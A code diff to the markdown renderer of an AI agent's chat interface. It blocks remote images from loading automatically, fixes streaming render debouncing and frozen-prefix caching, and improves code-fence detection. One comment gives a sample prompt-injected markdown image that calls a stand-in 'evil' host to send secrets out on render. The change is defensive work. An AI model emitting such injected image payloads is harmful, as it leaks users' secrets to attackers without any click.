@@ -42,6 +42,49 @@ let _markedHardenedFlag = false;
 export function _resetMarkedHardenedFlagForTests() {
     _markedHardenedFlag = false;
 }
+// Image sources that may load inline: data:image/*, blob:, and our own
+// origin (bundled assets / relative paths). Anything else is remote.
+function _isInlineSafeImageSrc(href) {
+    if (/^data:image\//i.test(href) || /^blob:/i.test(href)) return true;
+    try {
+        // Compare scheme + host rather than `.origin`: for non-special
+        // schemes (tauri://localhost on macOS/Linux) URL.origin is the
+        // opaque "null", which would never match location.origin.
+        const url = new URL(href, document.baseURI);
+        return url.protocol === window.location.protocol && url.host === window.location.host;
+    } catch {
+        return false;
+    }
+}
+
+// Agent markdown images must not auto-load remote URLs: with CSP null, a
+// prompt-injected `![](https://evil/?d=<secrets>)` would exfiltrate data the
+// moment the message renders, with no click. Remote images become a link
+// (alt text + host) the user can choose to open in the browser. token.href
+// is already resolved for reference-style images.
+function _renderImageToken(token) {
+    const href = token.href || '';
+    if (_isInlineSafeImageSrc(href)) return false; // marked's default <img>
+    let host = '';
+    let remote = false;
+    try {
+        const url = new URL(href, document.baseURI);
+        remote = url.protocol === 'http:' || url.protocol === 'https:';
+        if (remote) host = url.host;
+    } catch {
+        /* unparseable — treat as non-remote text */
+    }
+    const alt = token.text || '';
+    const label = alt && host ? `${alt} (${host})` : alt || host || href;
+    if (!remote) return _escapeHtmlForMarked(label);
+    const a = document.createElement('a');
+    a.className = 'md-remote-image';
+    a.setAttribute('href', href);
+    a.title = href;
+    a.textContent = label;
+    return a.outerHTML;
+}
+
 export function hardenMarkedOnce() {
     if (_markedHardenedFlag) return;
     if (typeof marked === 'undefined' || !marked.use) return;
@@ -49,6 +92,9 @@ export function hardenMarkedOnce() {
         renderer: {
             html(token) {
                 return _escapeHtmlForMarked(token.text || '');
+            },
+            image(token) {
+                return _renderImageToken(token);
             },
         },
     });
@@ -80,6 +126,7 @@ export function setExtensionManager(em) {
 const STREAMING_RENDER_INTERVAL = 150; // ms between renders during streaming
 const _renderTimers = new WeakMap(); // targetElement → timer id
 const _lastRenderTime = new WeakMap(); // targetElement → timestamp
+const _pendingMarkdown = new WeakMap(); // targetElement → newest text awaiting the timer
 
 // --- App icon inline rendering ---
 // Replaces <app-icon name="processName"/> tags with inline icon images.
@@ -162,7 +209,7 @@ let _appIconPlaceholderId = 0;
 // that won't change) and an "active tail" (the last incomplete block).
 // Only the tail is re-parsed on each chunk, turning O(n²) into ~O(n).
 const _frozenHtml = new WeakMap(); // targetElement → rendered HTML string for frozen prefix
-const _frozenLength = new WeakMap(); // targetElement → char count of frozen markdown prefix
+const _frozenMarkdown = new WeakMap(); // targetElement → the frozen markdown prefix itself
 
 /**
  * Render markdown into a target element.
@@ -173,21 +220,16 @@ const _frozenLength = new WeakMap(); // targetElement → char count of frozen m
  */
 export function renderMarkdown(markdown, targetElement, streaming = false) {
     if (!markdown) {
+        _cancelPendingRender(targetElement);
         targetElement.innerHTML = '';
-        _frozenHtml.delete(targetElement);
-        _frozenLength.delete(targetElement);
+        _clearFrozenState(targetElement);
         return;
     }
 
     if (!streaming) {
         // Final render — cancel any pending debounce, clear incremental state, do full render
-        const pending = _renderTimers.get(targetElement);
-        if (pending) {
-            clearTimeout(pending);
-            _renderTimers.delete(targetElement);
-        }
-        _frozenHtml.delete(targetElement);
-        _frozenLength.delete(targetElement);
+        _cancelPendingRender(targetElement);
+        _clearFrozenState(targetElement);
         _doRender(markdown, targetElement, false);
         return;
     }
@@ -199,23 +241,39 @@ export function renderMarkdown(markdown, targetElement, streaming = false) {
 
     if (elapsed >= STREAMING_RENDER_INTERVAL) {
         // Enough time has passed — render immediately
-        const pending = _renderTimers.get(targetElement);
-        if (pending) {
-            clearTimeout(pending);
-            _renderTimers.delete(targetElement);
-        }
+        _cancelPendingRender(targetElement);
         _doRender(markdown, targetElement, true);
     } else {
+        // Always record the newest text: the pending timer must paint what
+        // arrived last, not the snapshot from when it was scheduled (else a
+        // long tool call after a burst shows text missing its final chunks).
+        _pendingMarkdown.set(targetElement, markdown);
         // Schedule a render for when the interval expires (if not already scheduled)
         if (!_renderTimers.has(targetElement)) {
             const delay = STREAMING_RENDER_INTERVAL - elapsed;
             const timer = setTimeout(() => {
                 _renderTimers.delete(targetElement);
-                _doRender(markdown, targetElement, true);
+                const latest = _pendingMarkdown.get(targetElement);
+                _pendingMarkdown.delete(targetElement);
+                if (latest) _doRender(latest, targetElement, true);
             }, delay);
             _renderTimers.set(targetElement, timer);
         }
     }
+}
+
+function _cancelPendingRender(targetElement) {
+    const pending = _renderTimers.get(targetElement);
+    if (pending) {
+        clearTimeout(pending);
+        _renderTimers.delete(targetElement);
+    }
+    _pendingMarkdown.delete(targetElement);
+}
+
+function _clearFrozenState(targetElement) {
+    _frozenHtml.delete(targetElement);
+    _frozenMarkdown.delete(targetElement);
 }
 
 function _doRender(markdown, targetElement, streaming) {
@@ -245,13 +303,15 @@ function _doRender(markdown, targetElement, streaming) {
     if (streaming && markdown.includes('```automation_plan')) {
         const completeBlock = /```automation_plan\s*\n[\s\S]*?\n```/.test(markdown);
         if (!completeBlock) {
-            // Block is still being streamed — strip it and render any text before it
-            const beforeBlock = markdown.split('```automation_plan')[0].trim();
-            if (beforeBlock) {
-                targetElement.innerHTML = marked.parse(beforeBlock, { breaks: true });
-            }
-            // Don't render anything for the incomplete block — the app handles it
-            return;
+            // Block is still being streamed — strip it and render any text
+            // before it. Don't render anything for the incomplete block — the
+            // app handles it.
+            const beforeBlock = markdown.split('```automation_plan')[0].trimEnd();
+            if (!beforeBlock.trim()) return;
+            // Fall through to the normal incremental path (rather than a raw
+            // innerHTML write) so links get neutralized, the frozen-prefix
+            // cache stays coherent, and the other post-processing runs.
+            markdown = beforeBlock;
         }
     }
 
@@ -292,13 +352,28 @@ function _doRender(markdown, targetElement, streaming) {
         const splitIdx = _findStableSplitPoint(markdown);
         const prefixMd = splitIdx > 0 ? markdown.substring(0, splitIdx) : '';
         const tailMd = splitIdx > 0 ? markdown.substring(splitIdx) : markdown;
-        const prevFrozenLen = _frozenLength.get(targetElement) || 0;
+        const prevFrozenMd = _frozenMarkdown.get(targetElement) || '';
 
-        // Detect if the prefix shrank or disappeared — need a full rebuild
-        const prefixShrunk = prevFrozenLen > 0 && prefixMd.length < prevFrozenLen;
+        // Compare content, not length: keepLastTaskPlan and the fence
+        // stripping above can rewrite earlier text, so a longer prefix is
+        // not necessarily an extension of the old one.
+        const frozenChanged = prefixMd !== prevFrozenMd;
+        // Normal streaming growth — the old prefix is still a prefix. Parse
+        // and process only the newly frozen slice and append it, instead of
+        // re-parsing (and re-highlighting, re-building previews for) the
+        // whole prefix at every paragraph. The slice starts at a top-level
+        // blank line outside any fence. Cross-slice constructs (loose
+        // lists, reference definitions) may render slightly differently
+        // until the final non-streaming render re-parses everything.
+        const canAppend =
+            frozenChanged &&
+            prevFrozenMd.length > 0 &&
+            prefixMd.startsWith(prevFrozenMd) &&
+            !!targetElement.querySelector(':scope > .markdown-frozen') &&
+            !!targetElement.querySelector(':scope > .markdown-tail');
 
-        // If the prefix grew (or shrank — rebuild), render and cache the new frozen prefix
-        if (prefixMd.length > prevFrozenLen || prefixShrunk) {
+        // Prefix rewritten, shrank or first appeared — full rebuild
+        if (frozenChanged && !canAppend) {
             // Preserve rendered diagrams from the frozen section before re-rendering
             const savedDiagrams = new Map();
             targetElement.querySelectorAll('.diagram-wrapper[data-rendered]').forEach((wrapper) => {
@@ -312,7 +387,7 @@ function _doRender(markdown, targetElement, streaming) {
             marked.setOptions({ breaks: true, gfm: true });
             const frozenRendered = prefixMd ? marked.parse(prefixMd) : '';
             _frozenHtml.set(targetElement, frozenRendered);
-            _frozenLength.set(targetElement, prefixMd.length);
+            _frozenMarkdown.set(targetElement, prefixMd);
 
             // Build frozen container (only if there's a prefix)
             const frozenDiv = prefixMd ? document.createElement('div') : null;
@@ -336,6 +411,12 @@ function _doRender(markdown, targetElement, streaming) {
                     }
                 });
             }
+            // Rendered diagrams the frozen section didn't reuse (all of them
+            // when the prefix vanished) go to the tail too — otherwise they'd
+            // be discarded and re-rendered from scratch.
+            for (const [code, wrapper] of savedDiagrams) {
+                if (!tailSavedDiagrams.has(code)) tailSavedDiagrams.set(code, wrapper);
+            }
 
             const tailDiv = document.createElement('div');
             tailDiv.className = 'markdown-tail';
@@ -348,7 +429,7 @@ function _doRender(markdown, targetElement, streaming) {
             if (frozenDiv) targetElement.appendChild(frozenDiv);
             targetElement.appendChild(tailDiv);
         } else {
-            // Prefix unchanged — only re-render the tail
+            // Prefix unchanged (or only appended to) — only re-render the tail
             let tailDiv = targetElement.querySelector('.markdown-tail');
             if (!tailDiv) {
                 // First render or structure mismatch — do a full incremental setup
@@ -368,7 +449,7 @@ function _doRender(markdown, targetElement, streaming) {
                 if (prefixMd) {
                     const frozenRendered = _frozenHtml.get(targetElement) || marked.parse(prefixMd);
                     _frozenHtml.set(targetElement, frozenRendered);
-                    _frozenLength.set(targetElement, prefixMd.length);
+                    _frozenMarkdown.set(targetElement, prefixMd);
 
                     const frozenDiv = document.createElement('div');
                     frozenDiv.className = 'markdown-frozen';
@@ -409,6 +490,21 @@ function _doRender(markdown, targetElement, streaming) {
                 }
             });
 
+            if (canAppend) {
+                // The newly frozen blocks were the head of the old tail, so
+                // they reuse the tail's saved diagram wrappers.
+                marked.setOptions({ breaks: true, gfm: true });
+                const sliceHtml = marked.parse(prefixMd.slice(prevFrozenMd.length));
+                const sliceDiv = document.createElement('div');
+                sliceDiv.innerHTML = sliceHtml;
+                processCodeBlocks(sliceDiv, true, tailSavedDiagrams);
+                targetElement
+                    .querySelector(':scope > .markdown-frozen')
+                    .append(...sliceDiv.childNodes);
+                _frozenHtml.set(targetElement, (_frozenHtml.get(targetElement) || '') + sliceHtml);
+                _frozenMarkdown.set(targetElement, prefixMd);
+            }
+
             if (tailMd.trim()) {
                 marked.setOptions({ breaks: true, gfm: true });
                 tailDiv.innerHTML = marked.parse(tailMd);
@@ -418,8 +514,9 @@ function _doRender(markdown, targetElement, streaming) {
             }
         }
 
-        // Process app-icon tags
-        _processAppIcons(targetElement);
+        // Process app-icon tags. Gate on the source so the common case
+        // doesn't serialize the whole message's innerHTML every render.
+        if (markdown.includes('app-icon')) _processAppIcons(targetElement);
 
         // Strip navigable hrefs so WebView2 can't open links itself (in
         // addition to our click handler). See neutralizeLinks.
@@ -450,7 +547,7 @@ function _doRender(markdown, targetElement, streaming) {
     makeTablesSortable(targetElement);
 
     // Process app-icon tags
-    _processAppIcons(targetElement);
+    if (markdown.includes('app-icon')) _processAppIcons(targetElement);
 
     // Strip navigable hrefs so WebView2 can't open links itself (in addition
     // to our click handler). See neutralizeLinks.
@@ -467,8 +564,14 @@ function _doRender(markdown, targetElement, streaming) {
 
 /**
  * Find the last safe split point in markdown where we can freeze the prefix.
- * A safe split is a double-newline (\n\n) that is NOT inside a code fence.
- * Returns the index right after the \n\n, or 0 if no safe split found.
+ * A safe split is a double-newline (\n\n) that is NOT inside a code fence
+ * and leaves a tail of at least 50 chars. Returns the index right after the
+ * \n\n, or 0 if no safe split qualifies.
+ *
+ * Falling back to an earlier qualifying split (rather than returning 0 when
+ * the latest one is too close to the end) keeps the frozen prefix from
+ * collapsing at the start of every new paragraph — that collapse forced two
+ * full rebuilds per paragraph and re-rendered every diagram.
  *
  * Exported (with underscore prefix to preserve "private" intent) so the
  * incremental streaming logic can be exercised in isolation — this is the
@@ -476,38 +579,52 @@ function _doRender(markdown, targetElement, streaming) {
  * "implementation detail, don't import elsewhere".
  */
 export function _findStableSplitPoint(markdown) {
-    let inFence = false;
+    // Open fence as { ch, len, indent }, or null. Fences may be indented
+    // (agents nest them in list items) and use ``` or ~~~; only a bare run
+    // of the same char, at least as long and indented less than 4 columns
+    // past the opener, closes one (deeper lines are fence content).
+    let fence = null;
     let lastSafeSplit = 0;
 
     // Scan for code fences and double-newlines
     let i = 0;
     while (i < markdown.length) {
-        // Check for code fence (``` at start of line)
-        if (
-            (i === 0 || markdown[i - 1] === '\n') &&
-            markdown[i] === '`' &&
-            markdown[i + 1] === '`' &&
-            markdown[i + 2] === '`'
-        ) {
-            inFence = !inFence;
-            i += 3;
-            // Skip to end of line
-            while (i < markdown.length && markdown[i] !== '\n') i++;
-            continue;
+        if (i === 0 || markdown[i - 1] === '\n') {
+            let end = markdown.indexOf('\n', i);
+            if (end === -1) end = markdown.length;
+            const m = /^([ \t]*)(`{3,}|~{3,})(.*)$/.exec(markdown.slice(i, end));
+            if (m) {
+                const indent = m[1].length;
+                const ch = m[2][0];
+                const len = m[2].length;
+                if (!fence) {
+                    // A backtick info string can't contain a backtick
+                    // (CommonMark) — "```foo```" is an inline code span.
+                    if (ch !== '`' || !m[3].includes('`')) fence = { ch, len, indent };
+                } else if (
+                    ch === fence.ch &&
+                    len >= fence.len &&
+                    !m[3].trim() &&
+                    indent < fence.indent + 4
+                ) {
+                    fence = null;
+                }
+                // Skip to end of line
+                i = end;
+                continue;
+            }
         }
 
-        // Check for double-newline outside of fences
-        if (!inFence && markdown[i] === '\n' && markdown[i + 1] === '\n') {
-            lastSafeSplit = i + 2;
+        // Check for double-newline outside of fences. Don't freeze if the
+        // split is too close to the end — not worth it.
+        if (!fence && markdown[i] === '\n' && markdown[i + 1] === '\n') {
+            if (markdown.length - (i + 2) >= 50) lastSafeSplit = i + 2;
             i += 2;
             continue;
         }
 
         i++;
     }
-
-    // Don't freeze if the split is too close to the end — not worth it
-    if (markdown.length - lastSafeSplit < 50) return 0;
 
     return lastSafeSplit;
 }
